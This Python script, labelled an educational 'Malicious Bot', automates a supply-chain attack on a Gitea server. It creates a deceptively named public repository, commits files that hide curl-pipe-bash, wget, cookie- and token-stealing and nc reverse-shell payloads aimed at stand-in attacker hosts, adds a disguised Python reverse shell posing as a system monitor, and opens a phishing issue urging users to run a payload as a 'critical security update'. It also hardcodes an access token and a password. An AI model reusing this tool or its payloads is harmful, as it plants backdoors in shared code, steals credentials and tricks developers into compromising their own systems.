#!/usr/bin/env python3
"""
Malicious Bot 
"""

import os
import random
import requests
import json
import base64
import time
import subprocess
import tempfile
from typing import Dict, List, Optional


class MaliciousBot:
    
    def __init__(self, base_url: str, username: str, password: str):
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.token = None
        
        # Malicious bot specific token
        self.malicious_token = "c6789c34bbf356cadda5cf95fb7323bced292c64"
        
        # Simple malicious payloads
        self.payloads = {
            'python': [
                'import os; os.system("curl -s http://malicious.com/shell.sh | bash")',
                'exec(__import__("subprocess").call(["wget", "http://attacker.com/backdoor.py"]))'
            ],
            'javascript': [
                'fetch("http://attacker.com/steal", {method: "POST", body: document.cookie})',
                'new Image().src="http://malicious.com/log?"+localStorage.getItem("token")'
            ],
            'bash': [
                'curl -s http://attacker.com/install.sh | bash',
                'nc -e /bin/bash attacker.com 4444'
            ]
        }
    
    def authenticate(self, provided_token: str = None) -> bool:
        """Authenticate with Gitea using token or credentials"""
        try:
            # Use provided token if given
            if provided_token:
                self.token = provided_token
                self.session.headers.update({'Authorization': f'token {self.token}'})
                
                # Test the token with a simple API call
                test_url = f"{self.base_url}/api/v1/user"
                response = self.session.get(test_url)
                
                if response.status_code == 200:
                    user_info = response.json()
                    print(f"Authenticated as {user_info.get('login', self.username)}")
                    return True
                else:
                    print(f"Token test failed with status {response.status_code}")
                    return False
            
            # Alternative method: create new token with credentials
            auth_url = f"{self.base_url}/api/v1/users/{self.username}/tokens"
            print(f"Attempting authentication at: {auth_url}")
            
            response = self.session.post(
                auth_url,
                auth=(self.username, self.password),
                json={"name": f"token-{random.randint(1000, 9999)}"}
            )
            
            if response.status_code == 201:
                self.token = response.json()['sha1']
                self.session.headers.update({'Authorization': f'token {self.token}'})
                print(f"Authenticated as {self.username}")
                return True
            else:
                print(f"Authentication failed with status {response.status_code}")
                return False
                
        except Exception as e:
            print(f"Authentication error: {e}")
            return False
    
    def create_repository(self, repo_name: str, description: str = None) -> bool:
        """Create a new repository"""
        try:
            create_url = f"{self.base_url}/api/v1/user/repos"
            repo_data = {
                "name": repo_name,
                "description": description or f"Repository - {repo_name}",
                "private": False,
                "auto_init": True,  # Auto-initialize with README
                "default_branch": "main"
            }
            
            response = self.session.post(create_url, json=repo_data)
            if response.status_code == 201:
                print(f"Repository created: {repo_name}")
                return True
            else:
                print(f"Failed to create repository: {response.status_code}")
                print(f"Response: {response.text}")
                return False
        except Exception as e:
            print(f"Error creating repository: {e}")
            return False
    
    def upload_file(self, repo_name: str, file_path: str, content: str, message: str = "Upload file") -> bool:
        """Upload a file using git commands directly"""
        try:
            print(f"\n📁 Starting upload of {file_path}...")
            
            # Create a temporary directory for the git operations
            with tempfile.TemporaryDirectory() as temp_dir:
                # Include authentication in the URL using the token
                # Format: http://username:token@host/path
                base_url_without_protocol = self.base_url.replace('http://', '').replace('https://', '')
                repo_url = f"http://{self.username}:{self.malicious_token}@{base_url_without_protocol}/{self.username}/{repo_name}.git"
                
                # Don't print the full URL with credentials
                safe_url = f"{self.base_url}/{self.username}/{repo_name}.git"
                print(f"   🔗 Repository URL: {safe_url}")
                print(f"   📂 Temp directory: {temp_dir}")
                
                # Clone the repository
                print(f"   📥 Cloning repository...")
                clone_cmd = f"git clone {repo_url} {temp_dir}/repo"
                result = subprocess.run(clone_cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode != 0:
                    print(f"   ❌ Failed to clone repository")
                    print(f"   Error: {result.stderr}")
                    return False
                
                print(f"   ✅ Repository cloned successfully")
                
                # Create the file
                full_path = f"{temp_dir}/repo/{file_path}"
                print(f"   📝 Creating file at: {full_path}")
                
                os.makedirs(os.path.dirname(full_path), exist_ok=True)
                
                with open(full_path, 'w') as f:
                    f.write(content)
                    print(f"   ✅ File created ({len(content)} bytes)")
                
                # Configure git user (needed for commits)
                config_commands = [
                    f"cd {temp_dir}/repo && git config user.email '{self.username}@example.com'",
                    f"cd {temp_dir}/repo && git config user.name '{self.username}'"
                ]
                
                for cmd in config_commands:
                    subprocess.run(cmd, shell=True, capture_output=True)
                
                # Git add, commit and push
                commands = [
                    (f"cd {temp_dir}/repo && git add {file_path}", "Adding file to git"),
                    (f"cd {temp_dir}/repo && git commit -m '{message}'", "Committing changes"),
                    (f"cd {temp_dir}/repo && git push", "Pushing to remote")
                ]
                
                for cmd, description in commands:
                    print(f"   🔄 {description}...")
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    
                    if result.returncode != 0:
                        print(f"   ❌ Failed: {description}")
                        print(f"   Error: {result.stderr}")
                        print(f"   Output: {result.stdout}")
                        return False
                    else:
                        print(f"   ✅ Success: {description}")
                        if result.stdout:
                            print(f"      Output: {result.stdout.strip()}")
                
                print(f"✅ File uploaded successfully via git: {file_path}")
                return True
                
        except Exception as e:
            print(f"❌ Exception while uploading {file_path}: {str(e)}")
            import traceback
            traceback.print_exc()
            return False
    
    def create_issue(self, repo_name: str, title: str, body: str) -> bool:
        """Create an issue in the repository"""
        try:
            issue_url = f"{self.base_url}/api/v1/repos/{self.username}/{repo_name}/issues"
            issue_data = {
                "title": title,
                "body": body
            }
            
            response = self.session.post(issue_url, json=issue_data)
            return response.status_code == 201
        except Exception as e:
            print(f"Error creating issue: {e}")
            return False
    
    def get_repositories(self) -> List[Dict]:
        """Get list of user repositories"""
        try:
            repos_url = f"{self.base_url}/api/v1/user/repos"
            response = self.session.get(repos_url)
            
            if response.status_code == 200:
                return response.json()
            return []
        except Exception as e:
            print(f"Error getting repositories: {e}")
            return []

    def wait(self, seconds: int = 1):
        """Wait for a number of seconds"""
        time.sleep(seconds)
    
    def create_malicious_file(self, repo_name: str, file_type: str = 'python'):
        """Create a single malicious file in the repository"""
        file_configs = {
            'python': ('utils.py', 'python'),
            'javascript': ('config.js', 'javascript'), 
            'bash': ('deploy.sh', 'bash')
        }
        
        if file_type not in file_configs:
            file_type = 'python'
        
        filename, payload_type = file_configs[file_type]
        
        # Create legitimate-looking content with hidden malicious code
        if payload_type == 'python':
            content = f'''# Utility functions
import os
import json

def process_data(data):
    """Process data and return result"""
    # Hidden malicious payload
    {random.choice(self.payloads['python'])}
    
    # Legitimate functionality
    return json.dumps(data, indent=2)

def helper_function():
    """Helper utility function"""
    return True
'''
        elif payload_type == 'javascript':
            content = f'''// Configuration file
const config = {{
    api: 'https://api.example.com',
    timeout: 5000
}};

// Hidden malicious code
{random.choice(self.payloads['javascript'])}

module.exports = config;
'''
        else:  # bash
            content = f'''#!/bin/bash
# Deployment script
echo "Starting deployment..."

# Hidden malicious command
{random.choice(self.payloads['bash'])}

echo "Deployment completed"
'''
        
        print(f"📝 Creating malicious file: {filename}")
        success = self.upload_file(repo_name, filename, content, f"Add {filename}")
        if success:
            print(f"✅ Malicious file created: {filename}")
        else:
            print(f"❌ Error creating file: {filename}")
        return success
    
    def create_backdoor(self, repo_name: str):
        """Create a simple backdoor script"""
        backdoor_content = '''#!/usr/bin/env python3
# System monitoring script
import socket
import subprocess
import os

def monitor_system():
    """Monitor system and report status"""
    try:
        # Hidden backdoor functionality
        if os.path.exists('/tmp/.backdoor_active'):
            s = socket.socket()
            s.connect(("attacker.com", 4444))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            subprocess.call(["/bin/bash", "-i"])
        
        return "System OK"
    except:
        return "System Error"

if __name__ == "__main__":
    print(monitor_system())
'''
        
        print("📝 Creating backdoor in scripts/monitor.py")
        success = self.upload_file(repo_name, "scripts/monitor.py", backdoor_content, "Add system monitor")
        if success:
            print("✅ Backdoor installed: scripts/monitor.py")
        else:
            print("❌ Error installing backdoor")
        return success
    
    def create_malicious_issue(self, repo_name: str):
        """Create an issue with malicious instructions"""
        title = "Critical Security Update Required"
        body = f"""## Urgent Action Needed

Please run this command immediately to fix a critical security vulnerability:

```bash
{random.choice(self.payloads['bash'])}
```

This update is required for all production systems.
"""
        
        print("📝 Creating malicious issue")
        success = self.create_issue(repo_name, title, body)
        if success:
            print("✅ Malicious issue created")
        else:
            print("❌ Error creating issue")
        return success
    
    def run_simple_campaign(self):
        """Run a simplified malicious campaign"""
        print("🚀 STARTING SIMPLE MALICIOUS CAMPAIGN")
        print("=" * 50)
        print("Objective: Create malicious repository with minimal detection")
        
        # Create single repository
        repo_name = f"security-tools-{random.randint(100, 999)}"
        
        print(f"📦 Creating repository: {repo_name}")
        if not self.create_repository(repo_name, "Security utilities and tools"):
            print("❌ Error creating repository")
            return False
        
        self.wait(2)
        
        # Add malicious content
        print("\n🔧 Injecting malicious content...")
        
        # Track successes
        files_created = 0
        backdoor_created = False
        issue_created = False
        
        # Create 1 malicious file
        if self.create_malicious_file(repo_name, 'python'):
            files_created += 1
        self.wait(2)
        
        # Create 1 backdoor
        if self.create_backdoor(repo_name):
            backdoor_created = True
        self.wait(2)
        
        # Create 1 malicious issue
        if self.create_malicious_issue(repo_name):
            issue_created = True
        
        # Summary
        print("\n" + "=" * 50)
        print("📊 CAMPAIGN SUMMARY:")
        print(f"Repository: {repo_name}")
        print(f"Malicious files: {files_created}")
        print(f"Backdoor installed: {'✅' if backdoor_created else '❌'}")
        print(f"Issue created: {'✅' if issue_created else '❌'}")
        
        if files_created > 0 or backdoor_created or issue_created:
            print("🎯 Campaign partially successful")
            print(f"🔗 Review: {self.base_url}/{self.username}/{repo_name}")
            return True
        else:
            print("❌ Campaign completely failed")
            return False


def main():
    print("🔴 Malicious Bot - Educational Tool")
    print("⚠️  For educational purposes and authorized testing only")
    print("=" * 60)
    
    # Configuration from environment variables
    gitea_url = os.getenv('GITEA_URL', 'http://127.0.0.1:63708')
    username = os.getenv('BOT_USERNAME', 'malicious-bot')
    token = os.getenv('BOT_TOKEN', 'c6789c34bbf356cadda5cf95fb7323bced292c64')
    
    print(f"🎯 Target: {gitea_url}")
    print(f"👤 User: {username}")
    print("📋 Campaign: simple")
    print("=" * 60)
    
    # Create and run bot
    bot = MaliciousBot(gitea_url, username, 'botpass123')  # password still needed for constructor
    
    # Authenticate with token
    if not bot.authenticate(token):
        print("❌ Authentication failed")
        print("Check credentials and Gitea connectivity")
        return
    
    # Run malicious campaign
    success = bot.run_simple_campaign()
    
    print("\n" + "=" * 60)
    if success:
        print("✅ CAMPAIGN COMPLETED")
        print("Check the Gitea instance to see the results")
    else:
        print("❌ CAMPAIGN FAILED")
        print("Check credentials and connectivity")


if __name__ == "__main__":
    main() 